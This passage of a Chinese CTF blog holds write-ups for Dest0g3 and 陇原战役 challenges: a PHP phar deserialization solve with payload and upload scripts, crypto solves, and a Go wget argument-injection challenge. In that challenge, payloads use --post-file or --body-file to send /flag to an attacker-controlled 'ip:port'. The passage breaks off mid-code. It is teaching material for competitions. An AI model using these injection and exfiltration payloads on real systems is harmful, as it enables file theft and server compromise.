Error(&quot;start&quot;);?&gt;</code></pre><p>题目很明显是要先post参数1去调用D类里的file_put_content，然后写入我们的phar文件，再通过file_get_content去访问phar文件来实现反序列化，从air类里的<code>echo new $p($value);</code>也能看出这里要用原生类来读目录和文件。</p><p>链子很简单，就不说了。这里主要的难度是绕过最后的<code>throw new Error(&quot;start&quot;);</code>语句，如果想利用destruct方法反序列化会因为最后的抛出错误的语句导致程序提前结束，所以这里要利用unset来绕过最后的错误，让反序列化成功进行</p><p>具体的步骤看这个</p><p>[<a href="https://blog.csdn.net/cosmoslin/article/details/120797688">phar反序列化][NSSCTF]prize_p1_Snakin_ya的博客-CSDN博客</a></p><p>所以写文件时：</p><p>参数1：</p><pre class="language-none"><code class="language-none">O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;</code></pre><p>参数0：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522131509238.png" alt="image-20220522131509238"></p><p>生成phar文件之后在010里进行修改（这是读文件的phar，读目录的时候忘了截图被覆盖了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522133028155.png" alt="image-20220522133028155"></p><p>然后修改签名</p><pre class="language-python" data-language="python"><code class="language-python">from hashlib import sha1file &#x3D; open(&#39;..&#x2F;php&#x2F;NSSCTF prize_p1&#x2F;ars.phar&#39;, &#39;rb&#39;).read()text &#x3D; file[:-28]  #读取开始到末尾除签名外内容last &#x3D; file[-8:]   #读取最后8位的GBMB和签名flagnew_file &#x3D; text+sha1(text).digest() + last  #生成新的文件内容，主要是此时sha1正确了。open(&#39;reaflag2.phar&#39;, &#39;wb&#39;).write(new_file)</code></pre><p>达到调用unset的目的</p><p>然后要绕过代码中的waf，可以对phar文件进行压缩，原理可以看这个<a href="https://www.anquanke.com/post/id/240007#h2-5">https://www.anquanke.com/post/id/240007#h2-5</a></p><p>再利用python脚本上传文件</p><pre class="language-none"><code class="language-none">import requesturl &#x3D; &#39;http:&#x2F;&#x2F;8bfdc886-3097-4a19-978d-9a417e256662.node4.buuoj.cn:81&#x2F;&#39;res &#x3D; requests.post(    url,    data&#x3D;&#123;        1: &#39;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;&#39;,        0: open(&#39;.&#x2F;reaflag2.phar.gz&#39;, &#39;rb&#39;).read()    &#125;) # 写入print(res.text)</code></pre><p>得到上传地址之后利用phar协议访问一下就行。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522131430525.png" alt="image-20220522131430525"></p><p>改phar内容的时候不能用txt，上传也不能用burp，这两个卡了我好久。。。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome-to-fxxking-DestCTF"><a href="#Welcome-to-fxxking-DestCTF" class="headerlink" title="Welcome to fxxking DestCTF"></a>Welcome to fxxking DestCTF</h2><p>纯签到</p><h2 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h2><p>图片里有个压缩包，分离出来之后发现需要密码，猜测密码也在图片里，zsteg跑一遍</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520142310366.png" alt="image-20220520142310366"></p><p>拿到密码,打开压缩包找到flag</p><h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><p>爆破跑密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520155335442.png" alt="image-20220520155335442"></p><p>里面是摩斯密码，解码之后是一大串数字</p><pre class="language-txt" data-language="txt"><code class="language-txt">5 C 7 5 3 0 3 0 3 5 3 2 5 C 7 5 3 0 3 0 3 4 3 7 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 6 3 4 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 4 3 2 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 4 6 4 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 7 3 4 5 C 7 5 3 0 3 0 3 4 3 5 5 C 7 5 3 0 3 0 3 5 6 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 6 6 2 5 C 7 5 3 0 3 0 3 6 3 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 5 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 3 3 2 5 C 7 5 3 0 3 0 3 5 3 5 5 C 7 5 3 0 3 0 3 3 3 0 5 C 7 5 3 0 3 0 3 6 3 3 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 6 6 3 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 4 6 5 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 5 3 1 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 </code></pre><p>复制到010里发现是Unicode编码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520162301828.png" alt="image-20220520162301828"></p><p>Unicode解码发现是base64，再解码得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520162337045.png" alt="image-20220520162337045"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>已知nce，要求出明文，就要先想办法求出qpd，</p><p>利用RsaCtfTool.py进行求解</p><p>求公钥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151555940.png" alt="image-20220520151555940"></p><p>然后再求私钥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151624537.png" alt="image-20220520151624537"></p><p>最后得到qpd</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151647055.png" alt="image-20220520151647055"></p><p>随便找个rsa脚本套进去就行了</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import long_to_bytesstring &#x3D; &#39;&#39;for x in range(1):   c &#x3D; 14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854   q &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401   p &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467   n &#x3D; 27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267   e &#x3D; 65537   #d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))   d &#x3D; 3121448257353397521008122343609193178885723335228834266026969249529973560167730063129299361044338541996643944734161746790345361029496254021234107830835147478445995827602129027084328557873121512535534338680955898684986137612006599528489101993024083016810624261537303995439156771941439694356136703960699682133382027158795284121176051335224541792139301998430867357667228591618159856224671481257868298256833038515716847186893503607277761265884934308680131384025054980116408946675249894376907198506526558779944638834026881901482983419902337359310844362781386068641635065060468067278449010820146945870895885764387716082673   m &#x3D; pow(c, d, n)   string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)print(string)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151729727.png" alt="image-20220520151729727"></p><h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><p>这个怎么说呢。。。确实很简单</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520153806437.png" alt="image-20220520153806437"></p><p>只要把给的值带进去然后把加密改成解密就行了</p><h2 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h2><p>离散对数问题</p><p>直接用sage求就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521223939336.png" alt="image-20220521223939336"></p><p>然后将结果转成十六进制再转换成字符</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521224029558.png" alt="image-20220521224029558"></p><h2 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h2><p>0xGame2021有个差不多的，直接抄一下现成的脚本</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *base &#x3D; pow(2,32)i &#x3D; 104984523a &#x3D; 3939333498b &#x3D; 3662432446m &#x3D; 2271373817state1 &#x3D; 17362state2 &#x3D; 20624# while i &lt;&#x3D; base:#     # print(i)#     if ((a*i+b)%m)&gt;&gt;16 &#x3D;&#x3D; state1 and ((((a*i+b)%m)*a+b)%m)&gt;&gt;16 &#x3D;&#x3D; state2:#         print(&#39;find it&#39;,i)#         break#     i+&#x3D;1seed &#x3D; 104984523#class LCG:    def __init__(self):        self.a &#x3D; a        self.b &#x3D; b        self.m &#x3D; m        self.seed &#x3D; 104984523    def next(self):        self.seed &#x3D; (self.a * self.seed + self.b) % self.m        return self.seed &gt;&gt; 16    def output(self):        print(&quot;a &#x3D; &#123;&#125;\nb &#x3D; &#123;&#125;\nm &#x3D; &#123;&#125;&quot;.format(self.a, self.b, self.m))        print(&quot;state1 &#x3D; &#123;&#125;&quot;.format(self.next()))        print(&quot;state2 &#x3D; &#123;&#125;&quot;.format(self.next()))lcg &#x3D; LCG()lcg.output()flag &#x3D; long_to_bytes(&#39;600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#39;).decode()c &#x3D; b&#39;&#39;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10))              for i in range(len(flag))])print(c)</code></pre><p>利用注释的那段爆出seed的值，然后带进去就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522150127328.png" alt="image-20220522150127328"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇原战役复现</title>
      <link href="/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>好久之前就想复现这个了，一直拖到了现在</p><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>下载附件后里面是个go文件</p><p>但是实际上这个题跟go关系不大</p><pre class="language-go" data-language="go"><code class="language-go">func getController(c *gin.Context) &#123;    cmd :&#x3D; exec.Command(&quot;&#x2F;bin&#x2F;wget&quot;, c.QueryArray(&quot;argv&quot;)[1:]...)&#x2F;&#x2F;这里的QueryArray是gin框架中接收一组请求的方法。因此在传参的过程中，数组内元素个数没有限制，只需要知道数组内的元素会拼接到一起跟在wget后面执行即可。    err :&#x3D; cmd.Run()    if err !&#x3D; nil &#123;        fmt.Println(&quot;error: &quot;, err)    &#125;        c.String(http.StatusOK, &quot;Nothing&quot;)&#125;    router.GET(&quot;&#x2F;wget&quot;, getController)</code></pre><p>可以看到/wget路由下有个getController</p><p>我们先了解一下wget</p><p>wget命令是Linux系统用于从Web下载文件的命令行工具，支持 HTTP、HTTPS及FTP协议下载文件，而且wget还提供了很多选项，例如下载多个文件、后台下载，使用代理等等</p><blockquote><p><a href="https://blog.dn.net/skdkjzz/article/details/39103947">嵌入式 Wget使用一点方法_skdkjzz的博客-CSDN博客</a></p><p><strong>post请求</strong></p><p>Wget默认发送Get请求，通过指定参数--post-dataor --post-file 这两个选项</p><p>e.g wget--post-data &quot;aaaa&quot; <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>​     wget--post-data &quot;user=foo&quot; <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>​     wget–post-file post_file <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p><strong>head请求</strong></p><p>wget --debug--spider <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>​     --spider并不下载文件，通过head请求服务器，获取web服务器响应</p><p><strong>–no-cache禁用缓存</strong></p><p>e.g  wget–no-cache <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>​     请求数据包头部Pragma :no-cache，不使用缓存，http1.1加上Cache-Control: no-cache, must-revalidate</p><p><strong>–referer使用referer</strong></p><p>Referrer主要用户点击的上一个页面，一般可以用做防盗链技术，防盗链可以在url后面加一个key=value加密字段，或者使用特定referer字段。</p><p>e.g  wget–debug –referer <a href="http://www.baidu.com/">www.baidu.com</a> <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p><strong>显示wget帮助和版本信息</strong></p><p>Wget –v or wget –h</p><p><strong>–e 就是执行命令</strong></p><p>e.g wget-e &quot;postdata=111111111&quot; <a href="http://localhost:8333/test.php">http://localhost:8333/test.php</a></p><p>这种形式和wget –post-data=”11111111” <a href="http://localhost:8333/test.php%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%E3%80%82">http://localhost:8333/test.php是相同的。</a></p><p><strong>logfile (-o)把debug信息输出到文件</strong></p><p>wget <a href="http://localhost:8333/test.php">http://localhost:8333/test.php</a> -ologfile</p><p><strong>referer设置</strong></p><p>wget --debug --referer &quot;<a href="http://www.baidu.com/dsadsa&quot;">www.baidu.com/dsadsa&quot;</a> <a href="http://www.baidu.com/index.html">www.baidu.com/index.html</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/cfbd9ca006b1">wget - 简书 (jianshu.com)</a></p><p>用法： wget [选项]... [URL]...</p><p>长选项所必须的参数在使用短选项时也是必须的。</p><p><strong>启动：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-V, --version</td><td>显示 Wget 的版本信息并退出。</td></tr><tr><td>-h, --help</td><td>打印此帮助。</td></tr><tr><td>-b, --background</td><td>启动后转入后台。</td></tr><tr><td>-e, --execute=COMMAND</td><td>运行一个“.wgetrc”风格的命令。</td></tr></tbody></table><p><strong>日志和输入文件：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-o, --output-file=FILE</td><td>将日志信息写入 FILE。</td></tr><tr><td>-a, --append-output=FILE</td><td>将信息添加至 FILE。</td></tr><tr><td>-d, --debug</td><td>打印大量调试信息。</td></tr><tr><td>-q, --quiet</td><td>安静模式 (无信息输出)。</td></tr><tr><td>-v, --verbose</td><td>详尽的输出 (此为默认值)。</td></tr><tr><td>-nv, --no-verbose</td><td>关闭详尽输出，但不进入安静模式。</td></tr><tr><td>--report-speed=TYPE</td><td>Output bandwidth as TYPE. TYPE can be bits.</td></tr><tr><td>-i, --input-file=FILE</td><td>下载本地或外部 FILE 中的 URLs。</td></tr><tr><td>-F, --force-html</td><td>把输入文件当成 HTML 文件。</td></tr><tr><td>-B, --base=URL</td><td>解析与 URL 相关的HTML 输入文件 (由 -i -F 选项指定)。</td></tr><tr><td>--config=FILE</td><td>Specify config file to use.</td></tr></tbody></table><p><strong>下载：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-t, --tries=NUMBER</td><td>设置重试次数为 NUMBER (0 代表无限制)。</td></tr><tr><td>--retry-connrefused</td><td>即使拒绝连接也是重试。</td></tr><tr><td>-O, --output-document=FILE</td><td>将文档写入 FILE。</td></tr><tr><td>-nc, --no-clobber</td><td>skip downloads that would download to existing files (overwriting them).</td></tr><tr><td>-c, --continue</td><td>断点续传下载文件。</td></tr><tr><td>--progress=TYPE</td><td>选择进度条类型。</td></tr><tr><td>-N, --timestamping</td><td>只获取比本地文件新的文件。</td></tr><tr><td>--no-use-server-timestamps</td><td>不用服务器上的时间戳来设置本地文件。</td></tr><tr><td>-S, --server-response</td><td>打印服务器响应。</td></tr><tr><td>--spider</td><td>不下载任何文件。</td></tr><tr><td>-T, --timeout=SECONDS</td><td>将所有超时设为 SECONDS 秒。</td></tr><tr><td>--dns-timeout=SECS</td><td>设置 DNS 查寻超时为 SECS 秒。</td></tr><tr><td>--connect-timeout=SECS</td><td>设置连接超时为 SECS 秒。</td></tr><tr><td>--read-timeout=SECS</td><td>设置读取超时为 SECS 秒。</td></tr><tr><td>-w, --wait=SECONDS</td><td>等待间隔为 SECONDS 秒。</td></tr><tr><td>--waitretry=SECONDS</td><td>在获取文件的重试期间等待 1..SECONDS 秒。</td></tr><tr><td>--random-wait</td><td>获取多个文件时，每次随机等待间隔0.5<em>WAIT...1.5</em>WAIT 秒。</td></tr><tr><td>--no-proxy</td><td>禁止使用代理。</td></tr><tr><td>-Q, --quota=NUMBER</td><td>设置获取配额为 NUMBER 字节。</td></tr><tr><td>--bind-address=ADDRESS</td><td>绑定至本地主机上的 ADDRESS (主机名或是 IP)。</td></tr><tr><td>--limit-rate=RATE</td><td>限制下载速率为 RATE。</td></tr><tr><td>--no-dns-cache</td><td>关闭 DNS 查寻缓存。</td></tr><tr><td>--restrict-file-names=OS</td><td>限定文件名中的字符为 OS 允许的字符。</td></tr><tr><td>--ignore-case</td><td>匹配文件/目录时忽略大小写。</td></tr><tr><td>-4, --inet4-only</td><td>仅连接至 IPv4 地址。</td></tr><tr><td>-6, --inet6-only</td><td>仅连接至 IPv6 地址。</td></tr><tr><td>--prefer-family=FAMILY</td><td>首先连接至指定协议的地址FAMILY 为 IPv6，IPv4 或是 none。</td></tr><tr><td>--user=USER</td><td>将 ftp 和 http 的用户名均设置为 USER。</td></tr><tr><td>--password=PASS</td><td>将 ftp 和 http 的密码均设置为 PASS。</td></tr><tr><td>--ask-password</td><td>提示输入密码。</td></tr><tr><td>--no-iri</td><td>关闭 IRI 支持。</td></tr><tr><td>--local-encoding=ENC</td><td>IRI (国际化资源标识符) 使用 ENC 作为本地编码。</td></tr><tr><td>--remote-encoding=ENC</td><td>使用 ENC 作为默认远程编码。</td></tr><tr><td>--unlink</td><td>remove file before clobber.</td></tr></tbody></table><p><strong>目录：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-nd, --no-directories</td><td>不创建目录。</td></tr><tr><td>-x, --force-directories</td><td>强制创建目录。</td></tr><tr><td>-nH, --no-host-directories</td><td>不要创建主目录。</td></tr><tr><td>--protocol-directories</td><td>在目录中使用协议名称。</td></tr><tr><td>-P, --directory-prefix=PREFIX</td><td>以 PREFIX/... 保存文件</td></tr><tr><td>--cut-dirs=NUMBER</td><td>忽略远程目录中 NUMBER 个目录层。</td></tr></tbody></table><p><strong>HTTP 选项：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>--http-user=USER</td><td>设置 http 用户名为 USER。</td></tr><tr><td>--http-password=PASS</td><td>设置 http 密码为 PASS。</td></tr><tr><td>--no-cache</td><td>不在服务器上缓存数据。</td></tr><tr><td>--default-page=NAME</td><td>改变默认页(默认页通常是“index.html”)。</td></tr><tr><td>-E, --adjust-extension</td><td>以合适的扩展名保存 HTML/CSS 文档。</td></tr><tr><td>--ignore-length</td><td>忽略头部的‘Content-Length’区域。</td></tr><tr><td>--header=STRING</td><td>在头部插入 STRING。</td></tr><tr><td>--max-redirect</td><td>每页所允许的最大重定向。</td></tr><tr><td>--proxy-user=USER</td><td>使用 USER 作为代理用户名。</td></tr><tr><td>--proxy-password=PASS</td><td>使用 PASS 作为代理密码。</td></tr><tr><td>--referer=URL</td><td>在 HTTP 请求头包含‘Referer: URL’。</td></tr><tr><td>--save-headers</td><td>将 HTTP 头保存至文件。</td></tr><tr><td>-U, --user-agent=AGENT</td><td>标识为 AGENT 而不是 Wget/VERSION。</td></tr><tr><td>--no-http-keep-alive</td><td>禁用 HTTP keep-alive (永久连接)。</td></tr><tr><td>--no-cookies</td><td>不使用 cookies。</td></tr><tr><td>--load-cookies=FILE</td><td>会话开始前从 FILE 中载入 cookies。</td></tr><tr><td>--save-cookies=FILE</td><td>会话结束后保存 cookies 至 FILE。</td></tr><tr><td>--keep-session-cookies</td><td>载入并保存会话 (非永久) cookies。</td></tr><tr><td>--post-data=STRING</td><td>使用 POST 方式；把 STRING 作为数据发送。</td></tr><tr><td>--post-file=FILE</td><td>使用 POST 方式；发送 FILE 内容。</td></tr><tr><td>--method=HTTPMethod</td><td>use method &quot;HTTPMethod&quot; in the header.</td></tr><tr><td>--body-data=STRING</td><td>Send STRING as data. --method MUST be set.</td></tr><tr><td>--body-file=FILE</td><td>Send contents of FILE. --method MUST be set.</td></tr><tr><td>--content-disposition</td><td>当选中本地文件名时允许 Content-Disposition 头部 (尚在实验)。</td></tr><tr><td>--content-on-error</td><td>output the received content on server errors.</td></tr><tr><td>--auth-no-challenge</td><td>发送不含服务器询问的首次等待的基本 HTTP 验证信息。</td></tr></tbody></table><p><strong>HTTPS (SSL/TLS) 选项：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>--secure-protocol=PR</td><td>choose secure protocol, one of auto, SSLv2,SSLv3, TLSv1 and PFS.</td></tr><tr><td>--https-only</td><td>only follow secure HTTPS links</td></tr><tr><td>--no-check-certificate</td><td>不要验证服务器的证书。</td></tr><tr><td>--certificate=FILE</td><td>客户端证书文件。</td></tr><tr><td>--certificate-type=TYPE</td><td>客户端证书类型，PEM 或 DER。</td></tr><tr><td>--private-key=FILE</td><td>私钥文件。</td></tr><tr><td>--private-key-type=TYPE</td><td>私钥文件类型，PEM 或 DER。</td></tr><tr><td>--ca-certificate=FILE</td><td>带有一组 CA 认证的文件。</td></tr><tr><td>--ca-directory=DIR</td><td>保存 CA 认证的哈希列表的目录。</td></tr><tr><td>--random-file=FILE</td><td>带有生成 SSL PRNG 的随机数据的文件。</td></tr><tr><td>--egd-file=FILE</td><td>用于命名带有随机数据的 EGD 套接字的文件。</td></tr></tbody></table><p><strong>FTP 选项：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>--ftp-user=USER</td><td>设置 ftp 用户名为 USER。</td></tr><tr><td>--ftp-password=PASS</td><td>设置 ftp 密码为 PASS。</td></tr><tr><td>--no-remove-listing</td><td>不要删除‘.listing’文件。</td></tr><tr><td>--no-glob</td><td>不在 FTP 文件名中使用通配符展开。</td></tr><tr><td>--no-passive-ftp</td><td>禁用“passive”传输模式。</td></tr><tr><td>--preserve-permissions</td><td>保留远程文件的权限。</td></tr><tr><td>--retr-symlinks</td><td>递归目录时，获取链接的文件 (而非目录)。</td></tr></tbody></table><p><strong>WARC 选项：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>--warc-file=FILENAME</td><td>save request/response data to a .warc.gz file.</td></tr><tr><td>--warc-header=STRING</td><td>insert STRING into the warcinfo record.</td></tr><tr><td>--warc-max-size=NUMBER</td><td>set maximum size of WARC files to NUMBER.</td></tr><tr><td>--warc-cdx</td><td>write CDX index files.</td></tr><tr><td>--warc-dedup=FILENAME</td><td>do not store records listed in this CDX file.</td></tr><tr><td>--no-warc-compression</td><td>do not compress WARC files with GZIP.</td></tr><tr><td>--no-warc-digests</td><td>do not calculate SHA1 digests.</td></tr><tr><td>--no-warc-keep-log</td><td>do not store the log file in a WARC record.</td></tr><tr><td>--warc-tempdir=DIRECTORY</td><td>location for temporary files created by the WARC writer.</td></tr></tbody></table><p><strong>递归下载：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-r, --recursive</td><td>指定递归下载。</td></tr><tr><td>-l, --level=NUMBER</td><td>最大递归深度 (inf 或 0 代表无限制，即全部下载)。</td></tr><tr><td>--delete-after</td><td>下载完成后删除本地文件。</td></tr><tr><td>-k, --convert-links</td><td>让下载得到的 HTML 或 CSS 中的链接指向本地文件。</td></tr><tr><td>--backups=N</td><td>before writing file X, rotate up to N backup files.</td></tr><tr><td>-K, --backup-converted</td><td>在转换文件 X 前先将它备份为 X.orig。</td></tr><tr><td>-m, --mirror</td><td>-N -r -l inf --no-remove-listing 的缩写形式。</td></tr><tr><td>-p, --page-requisites</td><td>下载所有用于显示 HTML 页面的图片之类的元素。</td></tr><tr><td>--strict-comments</td><td>用严格方式 (SGML) 处理 HTML 注释。</td></tr></tbody></table><p><strong>递归接受/拒绝：</strong></p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-A, --accept=LIST</td><td>逗号分隔的可接受的扩展名列表。</td></tr><tr><td>-R, --reject=LIST</td><td>逗号分隔的要拒绝的扩展名列表。</td></tr><tr><td>--accept-regex=REGEX</td><td>regex matching accepted URLs.</td></tr><tr><td>--reject-regex=REGEX</td><td>regex matching rejected URLs.</td></tr><tr><td>--regex-type=TYPE</td><td>regex type (posix).</td></tr><tr><td>-D, --domains=LIST</td><td>逗号分隔的可接受的域列表。</td></tr><tr><td>--exclude-domains=LIST</td><td>逗号分隔的要拒绝的域列表。</td></tr><tr><td>--follow-ftp</td><td>跟踪 HTML 文档中的 FTP 链接。</td></tr><tr><td>--follow-tags=LIST</td><td>逗号分隔的跟踪的 HTML 标识列表。</td></tr><tr><td>--ignore-tags=LIST</td><td>逗号分隔的忽略的 HTML 标识列表。</td></tr><tr><td>-H, --span-hosts</td><td>递归时转向外部主机。</td></tr><tr><td>-L, --relative</td><td>只跟踪有关系的链接。</td></tr><tr><td>-I, --include-directories=LIST</td><td>允许目录的列表。</td></tr><tr><td>--trust-server-names</td><td>use the name specified by the redirection url last component.</td></tr><tr><td>-X, --exclude-directories=LIST</td><td>排除目录的列表。</td></tr><tr><td>-np, --no-parent</td><td>不追溯至父目录。</td></tr></tbody></table></blockquote><p>还可以利用wget进行一些命令外带</p><p><a href="https://blog.csdn.net/weixin_39696665/article/details/110465937"> -bash: wget: 未找到命令_利用命令注入外带数据的一些姿势_weixin_39696665的博客-CSDN博客</a></p><h3 id="一-直接使用wget"><a href="#一-直接使用wget" class="headerlink" title="一.直接使用wget"></a>一.直接使用wget</h3><p>这里我们就利用了<code>–post-file</code>实现对flag文件上传到我们自己服务器上的操作<code>wget --post-file /flag http://ip:port</code></p><p>因为根据代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512231220147.png" alt="image-20220512231220147"></p><p>可以看到这是从数组第二个开始取，所以第一个是什么都无所谓，我们要构造的payload要从第二个开始</p><p>payload</p><p><code>/wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://ip:port/</code></p><p>在就相当于将/flag里的内容上传到我们服务器的这个端口上，只要我们在服务器上监听这个端口，就能看到上传的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512230723967.png" alt="image-20220512230723967"></p><h3 id="二-使用proxy进行ssrf"><a href="#二-使用proxy进行ssrf" class="headerlink" title="二.使用proxy进行ssrf"></a>二.使用proxy进行ssrf</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512231839155.png" alt="image-20220512231839155"></p><p>在这里我们看到不仅仅是<code>--post-file</code>可以传输文件，<code>--body-file</code>同样可以，只是需要指定method</p><p>所以<code>/wget?argv=2&amp;argv=--body-file&amp;argv=/flag&amp;argv=--method=POST&amp;argv=http://ip:port/</code>同样可以</p><p>当然这个不是我们的ssrf</p><p>ssrf在/proxy路由里</p><pre class="language-go" data-language="go"><code class="language-go">func proxyController(c *gin.Context) &#123;        var url Url    if err :&#x3D; c.ShouldBindJSON(&amp;url); err !&#x3D; nil &#123;        c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;)        return    &#125;        re :&#x3D; 